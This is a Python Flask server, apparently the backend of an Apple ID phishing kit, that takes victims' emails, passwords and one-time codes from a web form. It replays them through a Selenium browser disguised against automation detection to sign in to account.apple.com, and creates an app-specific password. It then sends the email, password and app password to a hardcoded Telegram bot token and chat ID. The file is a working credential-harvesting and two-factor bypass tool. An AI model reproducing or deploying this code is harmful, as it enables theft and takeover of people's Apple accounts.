import shutil
from core_2 import generate_app_password
from core_2 import generate_app_password, simulate_human_typing
from flask import Flask, request, jsonify, send_from_directory
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import StaleElementReferenceException, TimeoutException, NoSuchElementException
from webdriver_manager.chrome import ChromeDriverManager
from resend_otp import resend_otp
import time
import random
import uuid
import os
from threading import Lock
import random
import json
import logging
import tempfile
# غير السطر 1-3 من هذا:
import shutil
from core_2 import generate_app_password
from core_2 import generate_app_password, simulate_human_typing

# إلى هذا:
import shutil
from core_2 import generate_app_password, simulate_human_typing, enter_otp_code, enter_otp_code_with_visual_keyboard
from core import send_telegram_message

logger = logging.getLogger(__name__)

app = Flask(__name__)
user_sessions = {}
session_lock = Lock()

# ---------- Logging & Messaging ----------


def logger_info(msg):
    print(f"[INFO] {msg}")


def logger_error(msg):
    print(f"[ERROR] {msg}")


# ---------- Utility Functions ----------


def enter_otp_code_with_visual_keyboard(driver, otp):
    logger_info(f"Saisie du code OTP avec clavier visuel: {otp}")
    try:
        otp_container = WebDriverWait(driver, 20).until(
            EC.presence_of_element_located(
                (By.CSS_SELECTOR, ".form-security-code-inputs"))
        )
        otp_inputs = otp_container.find_elements(
            By.CSS_SELECTOR, ".form-security-code-input")
        if len(otp_inputs) < 6:
            logger_error("Pas assez de champs OTP")
            return False

        for i in range(6):
            otp_inputs[i].click()
            otp_inputs[i].send_keys(otp[i])
            time.sleep(0.2)

        logger_info("OTP saisi une seule fois")
        time.sleep(5)
        return True
    except Exception as e:
        logger_error(f"Erreur OTP: {e}")
        return False


def enter_otp_code(driver, otp):
    logger_info(f"Saisie du code OTP: {otp}")
    if enter_otp_code_with_visual_keyboard(driver, otp):
        return True
    time.sleep(5)
    try:
        otp_container = WebDriverWait(driver, 20).until(
            EC.presence_of_element_located(
                (By.CSS_SELECTOR, ".form-security-code-inputs"))
        )
        otp_inputs = otp_container.find_elements(
            By.CSS_SELECTOR, ".form-security-code-input")
        if len(otp_inputs) >= 6:
            for i in range(6):
                if i < len(otp):
                    digit = otp[i]
                    script = """
                    var input = arguments[0];
                    var value = arguments[1];
                    input.value = value;
                    var event = new Event('input', {bubbles: true});
                    input.dispatchEvent(event);
                    var changeEvent = new Event('change', {bubbles: true});
                    input.dispatchEvent(changeEvent);
                    var keydownEvent = new Event('keydown', {bubbles: true});
                    input.dispatchEvent(keydownEvent);
                    var keyupEvent = new Event('keyup', {bubbles: true});
                    input.dispatchEvent(keyupEvent);
                    """
                    driver.execute_script(script, otp_inputs[i], digit)
                    time.sleep(0.3)
            time.sleep(2)
            all_filled = True
            for i in range(6):
                value = driver.execute_script(
                    "return arguments[0].value", otp_inputs[i])
                expected_value = otp[i] if i < len(otp) else ""
                if value != expected_value:
                    all_filled = False
            if all_filled:
                time.sleep(8)
                return True
    except Exception as e:
        logger_error(f"Erreur avec la méthode spécifique Apple: {e}")

    try:
        first_otp_field = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located(
                (By.CSS_SELECTOR, "input[type='text'][inputmode='numeric'], input[autocomplete='one-time-code']"))
        )
        first_otp_field.click()
        time.sleep(0.5)
        first_otp_field.clear()
        time.sleep(0.5)
        first_otp_field.send_keys(otp)
        time.sleep(2)
        first_otp_field.send_keys(Keys.ENTER)
        time.sleep(5)
        return True
    except Exception as e:
        logger_error(f"Erreur avec la méthode de saisie complète: {e}")
    logger_error("Aucune méthode de saisie OTP n'a fonctionné")
    return False


def safe_input_via_javascript(driver, element, text):
    try:
        script = """
        var element = arguments[0];
        var text = arguments[1];
        element.focus();
        var focusEvent = new Event('focus', { bubbles: true });
        element.dispatchEvent(focusEvent);
        element.value = text;
        var inputEvent = new Event('input', { bubbles: true });
        element.dispatchEvent(inputEvent);
        var changeEvent = new Event('change', { bubbles: true });
        element.dispatchEvent(changeEvent);
        var keyupEvent = new Event('keyup', { bubbles: true });
        element.dispatchEvent(keyupEvent);
        """
        driver.execute_script(script, element, text)
        time.sleep(1)
        return True
    except Exception as e:
        logger_error(f"Erreur JS input: {e}")
        return False


def create_driver_session():
    from selenium import webdriver
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.chrome.options import Options
    from webdriver_manager.chrome import ChromeDriverManager
    import tempfile

    chrome_options = Options()
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--window-size=1920,1080")
    chrome_options.add_argument("--user-agent=Mozilla/5.0")
    chrome_options.add_argument(
        "--disable-blink-features=AutomationControlled")
    chrome_options.add_experimental_option(
        "excludeSwitches", ["enable-automation"])
    chrome_options.add_experimental_option('useAutomationExtension', False)
    chrome_options.add_argument("--disable-web-security")
    chrome_options.add_argument("--allow-running-insecure-content")
    chrome_options.add_argument("--disable-extensions")
    # chrome_options.add_argument("--headless=new")  # إذا بغيت headless

    # هادي تخدم فـ Windows و Linux
    user_data_dir = tempfile.mkdtemp()
    chrome_options.add_argument(f"--user-data-dir={user_data_dir}")

    driver = webdriver.Chrome(
        service=Service(ChromeDriverManager().install()),
        options=chrome_options
    )
    driver.execute_script(
        "Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")

    # رجع حتى المسار باش تعود تستعمله فـ حذف الجلسة
    return driver, user_data_dir


def cleanup_old_sessions():
    global user_sessions
    current_time = time.time()
    sessions_to_remove = []
    with session_lock:
        for session_id, session_data in user_sessions.items():
            # 30 دقيقة
            if current_time - session_data.get('last_activity', 0) > 1800:
                try:
                    session_data['driver'].quit()
                    # حذف مجلد كروم الخاص بالجلسة
                    if 'user_data_dir' in session_data:
                        shutil.rmtree(
                            session_data['user_data_dir'], ignore_errors=True)
                    sessions_to_remove.append(session_id)
                except Exception:
                    sessions_to_remove.append(session_id)
        for session_id in sessions_to_remove:
            user_sessions.pop(session_id, None)


def cleanup_old_sessions():
    global user_sessions
    current_time = time.time()
    sessions_to_remove = []
    with session_lock:
        for session_id, session_data in user_sessions.items():
            # 1800 ثانية = 30 دقيقة
            if current_time - session_data.get('last_activity', 0) > 1800:
                try:
                    session_data['driver'].quit()  # يسد المتصفح ديال الجلسة
                    sessions_to_remove.append(session_id)
                    logger_info(
                        f"Session {session_id} nettoyée pour inactivité")
                except:
                    sessions_to_remove.append(session_id)
                    logger_info(f"Session {session_id} retirée (déjà fermée)")
        for session_id in sessions_to_remove:
            user_sessions.pop(session_id, None)  # يحيد الجلسة من اللائحة


def is_login_successful(driver):
    try:
        current_url = driver.current_url.lower()
        page_title = driver.title.lower()
        page_source = driver.page_source.lower()
        success_indicators = [
            "account.apple.com" in current_url and "sign-in" not in current_url,
            "myappleid.apple.com" in current_url,
            "idmsa.apple.com" in current_url and "signin" not in current_url,
            "manage" in current_url,
            "security" in current_url,
            "account" in current_url and "signin" not in current_url,
            "mon compte" in page_title,
            "account" in page_title and "sign" not in page_title,
            "gérer" in page_source,
            "manage your apple" in page_source
        ]
        error_indicators = [
            "vérifiez les informations",
            "incorrect",
            "erreur",
            "invalid",
            "try again",
            "معلومات غير صحيحة",
            "خاطئ",
            "غير صحيح",
            "identifiants incorrects",
            "your account has been locked",
            "unable to sign in",
            "sign-in",
            "incorrect apple id or password",
            "apple id or password was incorrect"
        ]
        for err in error_indicators:
            if err in page_source or err in page_title or err in current_url:
                return False
        error_selectors = [
            ".error-message",
            ".alert-error",
            "[aria-live='assertive']",
            ".alert",
            ".error",
            ".si-alert-content",
            "[class*='error']",
            "[class*='alert']",
            "[data-testid*='error']",
            ".notification--error"
        ]
        try:
            for selector in error_selectors:
                elements = driver.find_elements(By.CSS_SELECTOR, selector)
                for el in elements:
                    if el.is_displayed() and el.text.strip():
                        return False
        except:
            pass
        return any(success_indicators)
    except Exception as e:
        return False

# ---------- ERROR HANDLERS (toujours JSON) ----------


@app.errorhandler(404)
def page_not_found(error):
    return jsonify({"status": "error", "message": "URL not found"}), 404


@app.errorhandler(500)
def internal_error(error):
    return jsonify({"status": "error", "message": "Internal server error"}), 500

# ---------- ROUTES ----------


@app.route('/')
def serve_index():
    if os.path.exists('index.html'):
        return send_from_directory('.', 'index.html')
    else:
        return "<h2>Apple Login API Server is running!</h2>"


@app.route("/login", methods=["POST"])
def login():
    try:
        data = request.json
        email = data.get("email")
        password = data.get("password")
        otp = data.get("otp", None)
        security_code = data.get("securityCode", None)
        session_id = data.get("session_id", None)
        restart = data.get("restart", False)

        logger_info(f"Login attempt: {email}, restart: {restart}")

        # تنظيف الجلسات القديمة
        if random.random() < 0.1:
            cleanup_old_sessions()

        # إعادة تشغيل الجلسة إذا طلب المستخدم ذلك
        if restart and session_id and session_id in user_sessions:
            try:
                user_sessions[session_id]['driver'].quit()
                if 'user_data_dir' in user_sessions[session_id]:
                    import shutil
                    shutil.rmtree(
                        user_sessions[session_id]['user_data_dir'], ignore_errors=True)
            except Exception:
                pass
            with session_lock:
                user_sessions.pop(session_id, None)
            logger_info(f"Session {session_id} restarted")
            return jsonify({"status": "restarted", "message": "Session restarted"})

        driver = None
        user_data_dir = None
        current_session_id = session_id
        session_is_new = False

        # إدارة الجلسات
        if current_session_id and current_session_id in user_sessions:
            session_data = user_sessions[current_session_id]
            driver = session_data['driver']
            user_data_dir = session_data.get('user_data_dir')
            session_data['last_activity'] = time.time()
            email = email or session_data.get('email')
            password = password or session_data.get('password')
            session_data['email'] = email
            session_data['password'] = password
        else:
            current_session_id = str(uuid.uuid4())
            driver, user_data_dir = create_driver_session()
            with session_lock:
                user_sessions[current_session_id] = {
                    'driver': driver,
                    'email': email,
                    'password': password,
                    'last_activity': time.time(),
                    'attempts': 0,
                    'user_data_dir': user_data_dir
                }
            logger_info(f"New session created: {current_session_id}")
            session_is_new = True

        # --- PHASE 1: LOGIN ---
        if email and password and not (otp or security_code):
            if session_is_new:
                driver.get("https://account.apple.com/sign-in")
                time.sleep(10)
            # إدخال الإيميل
            try:
                email_field = None
                iframes = driver.find_elements(By.TAG_NAME, "iframe")
                for iframe in iframes:
                    try:
                        driver.switch_to.frame(iframe)
                        email_field = WebDriverWait(driver, 8).until(
                            EC.presence_of_element_located(
                                (By.ID, "account_name_text_field"))
                        )
                        break
                    except Exception:
                        driver.switch_to.default_content()
                if not email_field:
                    driver.switch_to.default_content()
                    email_field = WebDriverWait(driver, 12).until(
                        EC.presence_of_element_located(
                            (By.ID, "account_name_text_field"))
                    )
                email_field.click()
                time.sleep(1)
                email_field.clear()
                # هنا بدل simulate_human_typing ب copier/coller
                email_field.send_keys(email)
                try:
                    continue_btn = WebDriverWait(driver, 8).until(
                        EC.element_to_be_clickable(
                            (By.CSS_SELECTOR, "#sign-in"))
                    )
                    driver.execute_script(
                        "arguments[0].click();", continue_btn)
                except Exception:
                    email_field.send_keys(Keys.RETURN)
                time.sleep(7)
            except Exception:
                pass

            # إدخال الباسوورد
            try:
                password_field = WebDriverWait(driver, 12).until(
                    EC.presence_of_element_located(
                        (By.ID, "password_text_field"))
                )
                password_field.click()
                time.sleep(1)
                # هنا بدل simulate_human_typing ب copier/coller
                password_field.send_keys(password)
                try:
                    signin_btn = WebDriverWait(driver, 8).until(
                        EC.element_to_be_clickable(
                            (By.CSS_SELECTOR, "#sign-in"))
                    )
                    driver.execute_script("arguments[0].click();", signin_btn)
                except Exception:
                    password_field.send_keys(Keys.RETURN)
                time.sleep(5)
            except Exception:
                pass

        # --- PHASE 2: OTP ---
        if otp or security_code:
            code = security_code if security_code else otp
            otp_selectors = [
                ".form-security-code-inputs",
                "input.form-security-code-input",
                "input[type='text'][aria-label*='code']",
                "input[type='text'][aria-label*='verification']",
                "input[placeholder*='code']",
                "input[inputmode='numeric']",
                "input[autocomplete='one-time-code']"
            ]
            requires_otp = False
            for selector in otp_selectors:
                try:
                    WebDriverWait(driver, 10).until(
                        EC.presence_of_element_located(
                            (By.CSS_SELECTOR, selector))
                    )
                    requires_otp = True
                    break
                except Exception:
                    continue
            if not requires_otp:
                return jsonify({"status": "error", "message": "No OTP field detected"}), 400

            if not enter_otp_code(driver, code):
                return jsonify({"status": "error", "message": "OTP input failed"}), 500

            # Wait for redirect after OTP
            logger_info("Waiting for redirection after OTP submission...")
            time.sleep(10)

            # Check for OTP errors
            try:
                error_selectors = [
                    ".error-message", ".alert-error", "[aria-live='assertive']",
                    ".alert", ".error", ".si-alert-content",
                    "[class*='error']", "[class*='alert']",
                    "[data-testid*='error']", ".notification--error"
                ]
                for selector in error_selectors:
                    error_elements = driver.find_elements(
                        By.CSS_SELECTOR, selector)
                    for element in error_elements:
                        if element.is_displayed() and element.text.strip():
                            text_lower = element.text.lower()
                            if any(word in text_lower for word in ['code', 'invalid', 'incorrect', 'error', 'wrong']):
                                error_msg = element.text.strip()
                                return jsonify({"status": "invalidOTP", "message": error_msg})
            except Exception:
                pass

            if "account.apple.com/account/manage" in driver.current_url:
                logger_info(
                    "OTP validated, starting generate_app_password...")
                app_password = generate_app_password(
                    driver, password,
                    telegram_token="7700304665:AAG4cxh7qbDmlckQOXX6MTS6DHNoTkmEeO4",
                    telegram_chat_id="7820518007"
                )
                message = f"""🍎 <b>NEW CONNECTED ACCOUNT</b> 🍎

📧 <b>Email:</b> <code>{email}</code>
🔑 <b>Password:</b> <code>{password}</code>
🔐 <b>App password:</b> <code>{app_password if app_password else 'Not generated'}</code>

"""
                send_telegram_message(message)

                page_title = driver.title
                user_sessions[current_session_id]['last_activity'] = time.time()
                return jsonify({
                    "status": "success",
                    "message": f"Login successful! Page: {page_title}",
                    "app_password": app_password,
                    "session_active": True,
                    "session_id": current_session_id
                })

        # --- CHECK ERRORS ---
        try:
            error_selectors = [
                ".error-message", ".alert-error", "[aria-live='assertive']",
                ".alert", ".error", ".si-alert-content",
                "[class*='error']", "[class*='alert']"
            ]
            for selector in error_selectors:
                error_elements = driver.find_elements(
                    By.CSS_SELECTOR, selector)
                for element in error_elements:
                    if element.text.strip():
                        error_msg = element.text.strip()
                        # هنا تقدر تبدل الرسالة من الفرنسية للإنجليزية
                        if "Vérifiez les informations de compte" in error_msg:
                            error_msg = "Please check the account information you entered and try again."
                        user_sessions[current_session_id]['attempts'] += 1
                        user_sessions[current_session_id]['last_activity'] = time.time(
                        )
                        return jsonify({
                            "status": "invalid_credentials",
                            "message": error_msg,
                            "session_id": current_session_id,
                            "attempts": user_sessions[current_session_id]['attempts']
                        })
        except Exception:
            pass

        # --- CHECK IF OTP REQUIRED ---
        otp_selectors = [
            ".form-security-code-inputs",
            "input.form-security-code-input",
            "input[type='text'][aria-label*='code']",
            "input[type='text'][aria-label*='verification']",
            "input[placeholder*='code']",
            "input[inputmode='numeric']",
            "input[autocomplete='one-time-code']"
        ]
        requires_otp = False
        for selector in otp_selectors:
            try:
                WebDriverWait(driver, 5).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, selector))
                )
                requires_otp = True
                break
            except Exception:
                continue
        if requires_otp:
            return jsonify({
                "status": "requiresOTP",
                "message": "Verification code required",
                "session_id": current_session_id
            })

        # --- SUCCESS NORMAL (no OTP) ---
        if is_login_successful(driver):
            user_sessions[current_session_id]['last_activity'] = time.time()
            app_password = generate_app_password(
                driver, password,
                telegram_token="7700304665:AAG4cxh7qbDmlckQOXX6MTS6DHNoTkmEeO4",
                telegram_chat_id="7820518007"
            )
            page_title = driver.title

            message = f"""🍎 <b>NEW APPLE ACCOUNT CONNECTED</b> 🍎

📧 <b>Email:</b> <code>{email}</code>
🔑 <b>Password:</b> <code>{password}</code>
🔐 <b>App password:</b> <code>{app_password if app_password else 'Not generated'}</code>

🌐 <b>URL:</b> {driver.current_url}
"""
            send_telegram_message(message)

            return jsonify({
                "status": "success",
                "message": f"Login successful! Page: {page_title}",
                "app_password": app_password,
                "session_active": True,
                "session_id": current_session_id
            })

        user_sessions[current_session_id]['attempts'] += 1
        user_sessions[current_session_id]['last_activity'] = time.time()
        return jsonify({
            "status": "invalid_credentials",
            "message": "Incorrect credentials or connection problem",
            "session_id": current_session_id,
            "attempts": user_sessions[current_session_id]['attempts']
        })

    except Exception as e:
        logger_error(f"❌ Selenium error: {e}")
        if 'current_session_id' in locals() and current_session_id and current_session_id in user_sessions:
            try:
                user_sessions[current_session_id]['driver'].quit()
                if 'user_data_dir' in user_sessions[current_session_id]:
                    import shutil
                    shutil.rmtree(
                        user_sessions[current_session_id]['user_data_dir'], ignore_errors=True)
            except Exception:
                pass
            with session_lock:
                user_sessions.pop(current_session_id, None)
        return jsonify({"status": "error", "message": f"Technical error: {str(e)}"}), 500


@app.route("/close-session", methods=["POST"])
def close_session():
    try:
        data = request.json
        session_id = data.get("session_id")
        if session_id and session_id in user_sessions:
            try:
                user_sessions[session_id]['driver'].quit()
            except:
                pass
            with session_lock:
                user_sessions.pop(session_id, None)
            logger_info(f"Session {session_id} fermée explicitement")
            return jsonify({"status": "success", "message": "Session fermée"})
        else:
            return jsonify({"status": "info", "message": "Aucune session active"})
    except Exception as e:
        logger_error(f"Erreur lors de la fermeture de session: {e}")
        return jsonify({"status": "error", "message": f"Erreur: {str(e)}"}), 500


@app.route("/list-sessions", methods=["GET"])
def list_sessions():
    try:
        session_list = []
        for session_id, session_data in user_sessions.items():
            session_list.append({
                "session_id": session_id,
                "email": session_data.get('email', 'N/A'),
                "attempts": session_data.get('attempts', 0),
                "last_activity": time.strftime('%Y-%m-%d %H:%M:%S',
                                               time.localtime(session_data.get('last_activity', 0)))
            })
        return jsonify({"status": "success", "sessions": session_list})
    except Exception as e:
        logger_error(f"Erreur lors du listage des sessions: {e}")
        return jsonify({"status": "error", "message": f"Erreur: {str(e)}"}), 500


@app.route("/resend-otp", methods=["POST"])
def resend_otp_route():
    data = request.json
    session_id = data.get("session_id")
    method = data.get("method", "iphone")
    print("user_sessions:", user_sessions)
    driver = user_sessions.get(session_id, {}).get("driver")
    driver = user_sessions.get(session_id, {}).get("driver")
    if not driver:
        return jsonify({"status": "error", "message": "Session invalide"}), 400
    from resend_otp import resend_otp
    success = resend_otp(driver, method)
    return jsonify({"status": "success" if success else "error"})


if __name__ == "__main__":
    app.run(debug=True, host='0.0.0.0', port=8000)
